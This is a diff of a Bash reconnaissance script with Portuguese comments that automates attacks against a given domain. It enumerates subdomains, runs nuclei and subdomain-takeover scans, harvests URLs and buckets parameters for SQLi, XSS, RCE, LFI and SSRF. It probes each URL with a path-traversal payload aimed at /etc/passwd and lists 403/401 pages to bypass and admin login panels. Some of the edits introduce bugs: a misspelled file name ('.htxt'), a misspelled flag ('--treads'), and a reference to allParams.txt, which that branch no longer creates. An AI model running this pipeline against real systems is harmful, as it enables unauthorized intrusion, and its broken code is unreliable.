@@ -4,39 +4,57 @@
     echo "Obs: Caso não tenha o arquivo de subdominios o script fara a enumeração sozinho"
     echo ""
 
+mkdir $1
+cd $1
+
 if [ "$2" == "" ]
 then
     #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
     amass enum --passive -d $1 -o domains_$1
     assetfinder --subs-only $1 | tee -a domains_$1
 
-    subfinder -d $1 -o domains_subfinder_$1
+    subfinder -d $1 -silent -o domains_subfinder_$1
     cat domains_subfinder_$1 | tee -a domains_$1
 
     sort -u domains_$1 -o domains_$1
     cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+
+    rm domains_$1
+    rm domains_subfinder_$1
     #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
 
     # Scaner de vuln
-    nuclei -l domains_$1.txt
+    nuclei -l domains_$1.txt -silent -o nuclei.txt
 
     # Subdomain takeonver
-    subzy -targets domains_$1 | tee subdomainTakeOver.txt
-
-    # Excluindo subdominios offline depois de tantar takeonver
-    rm domains_$1
+    subzy run --targets domains_$1.txt --https | tee subzy.txt
 
     # Procurar URLs com base na internet
-    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt
+    cat domains_$1.htxt | gau --treads 5 --subs | httpx -silent | sort | tee allUrls.txt
 
-    # Encontrar todos os parametros
-    grep "=" allUrls.txt | tee allParams.txt
+    # Encontrar todos os parametros especificos
+
+    mkdir parametros
+    cat allUrls.txt | gf debug_logic | tee parametros/debug_logic
+    cat allUrls.txt | gf img-traversal | tee parametros/img-traversal
+    cat allUrls.txt | gf interestingparams | tee parametros/interestingparams
+    cat allUrls.txt | gf jsvar | tee parametros/jsvar
+    cat allUrls.txt | gf sqli | tee parametros/sqli
+    cat allUrls.txt | gf ssti | tee parametros/ssti
+    cat allUrls.txt | gf idor | tee parametros/idor
+    cat allUrls.txt | gf interestingEXT | tee parametros/interestingEXT
+    cat allUrls.txt | gf interestingsubs | tee parametros/interestingsubs
+    cat allUrls.txt | gf lfi | tee parametros/lfi
+    cat allUrls.txt | gf rce | tee parametros/rce
+    cat allUrls.txt | gf redirect | tee parametros/redirect
+    cat allUrls.txt | gf ssrf | tee parametros/ssrf
+    cat allUrls.txt | gf xss | tee parametros/xss
 
     # Encontrar parametros refletidos
     cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest
 
     # Validar Path Transversal
-    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
+    httpx --silent -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
 
     # Encontrar extensões
     mkdir ext
@@ -46,27 +64,23 @@ then
     cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt
 
     # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
-    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt
+    cat allUrls.txt | httpx --silent -sc -nc | grep "403\|401" | tee bypass.txt
 
     # Encontrar paineis administrativos
-    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
+    cat allUrls.txt | httpx --silent -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
 
     echo ""
     echo "Enumeração realizada"
 
 else
-
     # Scaner de vuln
-    nuclei -l domains_$1.txt
+    nuclei -l domains_$1.txt -un -ut -silent -o nuclei.txt
 
     # Subdomain takeonver
-    subzy -targets domains_$1 | tee subdomainTakeOver.txt
-
-    # Excluindo subdominios offline depois de tantar takeonver
-    rm domains_$1
+    subzy run --targets domains_$1.txt --https | tee subzy.txt
 
     # Procurar URLs com base na internet
-    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt
+    cat domains_$1.txt | gau --threads 5 | httpx -silent | sort | tee allUrls.txt
 
     # Encontrar todos os parametros
     grep "=" allUrls.txt | tee allParams.txt
@@ -75,7 +89,7 @@ else
     cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest
 
     # Validar Path Transversal
-    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
+    httpx --silent -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
 
     # Encontrar extensões
     mkdir ext
@@ -85,10 +99,10 @@ else
     cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt
 
     # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
-    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt
+    cat allUrls.txt | httpx --silent -sc -nc | grep "403\|401" | tee bypass.txt
 
     # Encontrar paineis administrativos
-    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
+    cat allUrls.txt | httpx --silent -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
 
     echo ""
     echo "Enumeração realizada"
